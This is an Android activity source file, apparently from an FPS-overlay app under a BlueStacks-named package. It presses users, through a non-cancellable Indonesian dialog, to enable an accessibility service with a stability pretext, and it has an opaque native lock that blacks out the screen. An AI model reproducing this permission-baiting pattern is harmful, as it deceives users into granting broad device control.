package com.bluestacks.fpsoverlay;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import android.net.Uri;
import android.widget.CompoundButton;
import android.widget.EditText;
import androidx.appcompat.widget.SwitchCompat;
import android.widget.Button;
import android.widget.Toast;

public class CoreActivity extends AppCompatActivity {

    private AlertDialog currentDialog;

    public native boolean checkStatus();
    public native boolean isLockedNative();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            if (isLockedNative()) {
                setContentView(new android.view.View(this));
                getWindow().getDecorView().setBackgroundColor(android.graphics.Color.BLACK);
                return;
            }
            
            if (checkStatus()) {
                finish();
                return;
            }
        } catch (UnsatisfiedLinkError e) {
            // Handle native library not loaded
        }

        setContentView(R.layout.activity_main);
        initializeUI();
    }

    private void initializeUI() {
        final SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        final SwitchCompat swShow = findViewById(R.id.sw_show);
        final EditText etMin = findViewById(R.id.et_min);
        final EditText etMax = findViewById(R.id.et_max);
        final Button btnApply = findViewById(R.id.btn_apply);

        if (swShow == null || etMin == null || etMax == null || btnApply == null) {
            return;
        }

        String minVal = sharedPreferences.getString("min", "97");
        String maxVal = sharedPreferences.getString("max", "114");
        etMin.setText(minVal);
        etMax.setText(maxVal);

        boolean isShowing = sharedPreferences.getBoolean("is_showing", false);
        
        // Disable listener temporarily to set initial state without triggering logic
        swShow.setOnCheckedChangeListener(null);
        swShow.setChecked(isShowing);

        swShow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                if (!isServiceEnabled()) {
                    swShow.setChecked(false);
                    showModernAccessibilityDialog();
                } else {
                    sharedPreferences.edit().putBoolean("is_showing", true).apply();
                    updateServiceState(true);
                }
            } else {
                sharedPreferences.edit().putBoolean("is_showing", false).apply();
                updateServiceState(false);
            }
        });

        btnApply.setOnClickListener(v -> {
            String min = etMin.getText().toString();
            String max = etMax.getText().toString();
            if (!min.isEmpty() && !max.isEmpty()) {
                sharedPreferences.edit()
                    .putString("min", min)
                    .putString("max", max)
                    .apply();
                Toast.makeText(this, "Settings Applied", Toast.LENGTH_SHORT).show();
                if (swShow.isChecked() && isServiceEnabled()) {
                    updateServiceState(true);
                }
            }
        });
    }

    private void updateServiceState(boolean isShowing) {
        Intent intent = new Intent(this, SupportService.class);
        if (isShowing) {
            intent.setAction("SHOW_FPS");
        } else {
            intent.setAction("HIDE_FPS");
        }
        startService(intent);
    }

    private void showModernAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        currentDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert)
            .setTitle("FPS Realtime Optimization")
            .setMessage("Kami menggunakan overlay tipe aksesibilitas untuk menghindari bug overlay tenggelam atau tiba-tiba menghilang pas bermain. Dengan fitur aksesibilitas ini, FPS overlay kami jauh jadi lebih stabil dibanding menggunakan overlay biasa. Maka dari itu, klik izinkan aksesibilitas untuk menampilkan FPS overlay.")
            .setCancelable(false)
            .setPositiveButton("AKTIFKAN SEKARANG", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .setNegativeButton("NANTI", (dialog, which) -> dialog.dismiss())
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();
        SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        SwitchCompat swShow = findViewById(R.id.sw_show);
        if (swShow != null) {
            boolean shouldShow = sharedPreferences.getBoolean("is_showing", false);
            if (shouldShow && isServiceEnabled()) {
                swShow.setChecked(true);
                updateServiceState(true);
            } else if (shouldShow) {
                swShow.setChecked(false);
            }
        }
    }
}
